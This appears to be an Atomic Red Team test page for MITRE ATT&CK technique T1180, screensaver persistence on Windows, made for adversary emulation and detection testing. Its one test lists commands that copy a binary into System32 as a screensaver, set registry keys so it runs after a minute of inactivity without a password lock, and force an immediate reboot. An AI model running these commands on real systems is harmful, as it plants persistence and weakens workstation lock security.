# T1180 - Screensaver
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1180)
<blockquote>Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations. 

The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

* <code>SCRNSAVE.exe</code> - set to malicious PE path
* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)</blockquote>

## Atomic Tests

- [Atomic Test #1 - Set Arbitrary Binary as Screensaver](#atomic-test-1---set-arbitrary-binary-as-screensaver)


<br/>

## Atomic Test #1 - Set Arbitrary Binary as Screensaver
This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.

**Supported Platforms:** Windows


#### Inputs
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| input_binary | Executable binary to use in place of screensaver for persistence | path | C:\Windows\System32\cmd.exe|

#### Run it with `command_prompt`!  Elevation Required (e.g. root or admin) 
```
copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
shutdown /r /t 0
